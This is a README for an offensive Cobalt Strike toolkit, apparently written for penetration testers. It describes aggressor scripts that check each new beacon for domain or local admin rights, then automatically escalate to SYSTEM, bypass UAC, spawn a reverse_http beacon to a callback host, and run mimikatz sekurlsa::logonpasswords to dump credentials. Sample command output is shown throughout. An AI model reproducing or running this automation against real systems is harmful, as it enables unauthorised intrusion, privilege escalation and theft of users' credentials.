# CobaltStrike-ToolKit
I’m sure there are better ways of doing all of this but as of right now there hasn’t been much put out so this will do :)

## CheckDA - Command

Currently uses a PowerShell based check, combined with an aggressor script to check for the initial agent user name.
While using .NET 3.5 to perform Domain Group enumeration (PowerShell 2+ safe). This allows for alerting on Pen-Test of a DA level beacons. 
### Usage
Load up the Script:
```
aggressor> load /root/Tools/CobaltStrike-ToolKit/Initial-DACheck.cna
[+] Load /root/Tools/CobaltStrike-ToolKit/Initial-DACheck.cna
```
When a initial beacon comes in you receive a pop up box and will see:
```
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/Invoke-DACheck.ps1
[*] Tasked beacon to run: Invoke-DACheck -Initial True
[+] host called home, sent: 2527 bytes
[+] received output:
Found-DA-User: admin
```
### Independent Command:
```
beacon> checkda
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/Invoke-DACheck.ps1
[*] Tasked beacon to run: Invoke-DACheck
[+] host called home, sent: 2519 bytes
[+] received output:
[!] Currently DA Context
```
## CheckLA - Command

Currently uses a PowerShell based check, combined with an aggressor script to check for the initial agent context.
While using .NET 3.5 to perform Local Group enumeration and Token Context (PowerShell 2+ safe). This has the following context:
1. Checks for Initial Beacons Context (Elevated or Local Admin)
2. If the beacon is elevated it will Auto Getsystem, and run LogonPasswords
3. If the beacon in Local Admin but not in a high integrity process it will run Bypass UAC on that beacon
4. This will than launch a beacon in a high integrity beacon causing the first event to fire running LogonPasswords

### Usage 
Run this with all the other scripts
```
aggressor> load Initial-LAdminCheck.cna
[+] Reload /root/Tools/CobaltStrike-ToolKit/Initial-LAdminCheck.cna
```
when a Initial Beacon comes in:
```
aggressor> reload Initial-LAdminCheck.cna
[+] Reload /root/Tools/CobaltStrike-ToolKit/Initial-LAdminCheck.cna
```
If it returns as a Local Admin it will perform Bypass UAC:
```
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.1.198:80) in a high integrity process
[+] host called home, sent: 76304 bytes
```
The new beacon will run logonPassword as desired :)
```
[*] Tasked beacon to get SYSTEM
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 444597 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
[+] received output:
```
### Independent Command 
```
beacon> checkla
[*] Tasked beacon to import: /root/Tools/CobaltStrike-ToolKit/CheckLAdminContext.ps1
[*] Tasked beacon to run: Invoke-LocalAdminCheck
[+] host called home, sent: 2622 bytes
[+] received output:
[!] Currently-in-LocalAdmin-Context
```



